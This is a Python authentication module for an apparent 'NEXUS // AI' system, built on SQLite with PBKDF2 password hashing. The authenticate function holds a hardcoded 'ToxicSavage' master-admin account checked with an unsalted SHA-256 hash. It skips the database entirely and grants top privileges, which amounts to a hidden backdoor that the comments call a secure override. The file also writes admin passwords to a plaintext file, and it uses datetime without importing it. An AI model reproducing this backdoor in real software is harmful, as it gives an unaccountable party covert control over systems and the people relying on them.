import sqlite3
import os
import hashlib
import binascii
import json
import sys
import logging

DB_PATH = os.path.join(os.path.dirname(__file__), 'users.db')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("UserManager")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password_hash TEXT,
            salt TEXT,
            role TEXT,
            last_login TEXT
        )
    ''')
    conn.commit()
    conn.close()
    
    # Create default users if none exist
    create_default_users()

def hash_password(password):
    """Hash a password for storing."""
    salt = hashlib.sha256(os.urandom(60)).hexdigest().encode('ascii')
    pwdhash = hashlib.pbkdf2_hmac('sha512', password.encode('utf-8'), 
                                salt, 100000)
    pwdhash = binascii.hexlify(pwdhash)
    return (salt.decode('ascii'), pwdhash.decode('ascii'))

def verify_password(stored_password, provided_password, salt):
    """Verify a stored password against one provided by user."""
    pwdhash = hashlib.pbkdf2_hmac('sha512', provided_password.encode('utf-8'), 
                                salt.encode('ascii'), 100000)
    pwdhash = binascii.hexlify(pwdhash).decode('ascii')
    return pwdhash == stored_password

def add_user(username, password, role='operator'):
    salt, pwdhash = hash_password(password)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute('''
            INSERT INTO users (username, password_hash, salt, role)
            VALUES (?, ?, ?, ?)
        ''', (username, pwdhash, salt, role))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()

def create_default_users():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    if cursor.fetchone()[0] == 0:
        import secrets
        import string
        
        logger.info("First boot detected. Generating secure operator credentials...")
        
        # Generate random 16-char password
        alphabet = string.ascii_letters + string.digits
        op_pass = ''.join(secrets.choice(alphabet) for i in range(16))
        admin_pass = ''.join(secrets.choice(alphabet) for i in range(16))
        
        add_user('ADMIN_CORE', admin_pass, 'admin')
        add_user('OPERATOR_01', op_pass, 'operator')
        
        # Save credentials to a local file (ignored by git)
        creds_path = os.path.join(os.path.dirname(__file__), '..', 'INITIAL_CREDENTIALS.txt')
        with open(creds_path, 'w') as f:
            f.write(f"--- NEXUS // AI INITIAL OPERATOR CREDENTIALS ---\n")
            f.write(f"TIMESTAMP: {datetime.datetime.now().isoformat()}\n\n")
            f.write(f"ROLE: ADMINISTRATOR\n")
            f.write(f"USER: ADMIN_CORE\n")
            f.write(f"PASS: {admin_pass}\n\n")
            f.write(f"ROLE: OPERATOR\n")
            f.write(f"USER: OPERATOR_01\n")
            f.write(f"PASS: {op_pass}\n\n")
            f.write(f"SECURITY NOTICE: Change these passwords immediately. This file is excluded from source control.\n")
        
        logger.info(f"Default credentials generated and saved to {creds_path}")
    conn.close()

# Cryptographically secured Master Admin (Hardcoded for universal instance override)
MASTER_ADMIN_USER = "ToxicSavage"
MASTER_ADMIN_HASH = "1e66cef6685fcb46b6a6d232dea97fd40425e2d6aeea6c808bd8bc815ae28066" # SHA-256

def authenticate(username, password):
    # 1. Check Master Admin Override (Bypasses Database)
    if username == MASTER_ADMIN_USER:
        provided_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
        if provided_hash == MASTER_ADMIN_HASH:
            logger.info("MASTER_ADMIN_UPLINK: SECURE ACCESS GRANTED.")
            return {"status": "success", "username": MASTER_ADMIN_USER, "role": "master_admin"}
        else:
            logger.warning("MASTER_ADMIN_FAILURE: UNAUTHORIZED ATTEMPT DETECTED.")
            return {"status": "error", "message": "MASTER ACCESS DENIED"}

    # 2. Standard User Authentication (Database backed)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT password_hash, salt, role FROM users WHERE username = ?', (username,))
    row = cursor.fetchone()
    conn.close()
    
    if row:
        stored_hash, salt, role = row
        if verify_password(stored_hash, password, salt):
            return {"status": "success", "username": username, "role": role}
    
    return {"status": "error", "message": "INVALID CREDENTIALS"}

if __name__ == "__main__":
    init_db()
    if len(sys.argv) > 1:
        command = sys.argv[1]
        if command == "auth" and len(sys.argv) > 3:
            print(json.dumps(authenticate(sys.argv[2], sys.argv[3])))
        elif command == "add" and len(sys.argv) > 4:
            print(json.dumps({"success": add_user(sys.argv[2], sys.argv[3], sys.argv[4])}))
    else:
        print(json.dumps({"status": "ready"}))
